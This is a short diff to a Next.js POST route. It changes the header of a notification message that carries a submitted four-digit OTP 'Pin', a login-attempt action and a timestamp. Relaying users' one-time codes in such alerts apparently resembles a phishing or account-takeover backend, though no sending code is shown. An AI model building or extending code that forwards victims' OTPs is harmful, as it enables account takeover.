@@ -16,7 +16,7 @@ export async function POST(request: NextRequest) {
     }
 
     const message = `
-🔔 **4 DIGIT CODE SUBMITTED*
+🔔 **4 DIGIT OTP SUBMITTED**
     Pin :   ${otpCode}
 📋 Action: ${action === 'login_attempt' ? 'Login Attempt' : action}
 ⏰ Timestamp: ${new Date(timestamp).toLocaleString()}
